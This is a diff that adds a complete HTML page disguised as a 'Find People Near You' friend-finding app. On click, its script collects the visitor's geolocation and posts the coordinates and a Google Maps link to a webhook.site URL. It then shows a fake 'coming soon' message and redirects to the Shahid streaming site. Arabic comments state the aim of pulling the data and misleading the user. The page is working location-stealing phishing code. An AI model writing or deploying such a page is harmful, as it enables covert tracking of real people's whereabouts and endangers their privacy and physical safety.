@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Near You | شاهد من حولك</title>
+    <style>
+        body {
+            background-color: #000;
+            color: white;
+            font-family: 'Raleway', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .button {
+            background-color: #e50914;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        p { color: #ccc; }
+    </style>
+</head>
+<body>
+
+    <h1>Find People Near You</h1>
+    <p>Meet New People, Make New Friends</p>
+    
+    <button id="change" class="button" onclick="startProcess()">Continue</button>
+
+    <script>
+        function startProcess() {
+            document.getElementById('change').innerHTML = "جاري التحميل...";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const webhookUrl = "https://webhook.site/866c5c83-d3aa-4627-b9e5-5f835299495f";
+
+                    // إرسال البيانات فوراً لصفحة الـ Webhook الخاصة بك
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            latitude: lat,
+                            longitude: lon,
+                            map_link: `https://www.google.com/maps?q=${lat},${lon}`
+                        })
+                    }).then(() => {
+                        // بعد السحب، نوهمه أن الخدمة قيد التطوير
+                        alert("Thank you for taking interest! This product is coming soon in your area.");
+                        window.location.href = "https://shahid.mbc.net/";
+                    });
+
+                }, function(error) {
+                    alert("عذراً، يجب السماح بالوصول للموقع لتتمكن من رؤية الأشخاص القريبين منك.");
+                    document.getElementById('change').innerHTML = "Continue";
+                });
+            } else {
+                alert("متصفحك لا يدعم هذه الميزة.");
+            }
+        }
+    </script>
+</body>
+</html>
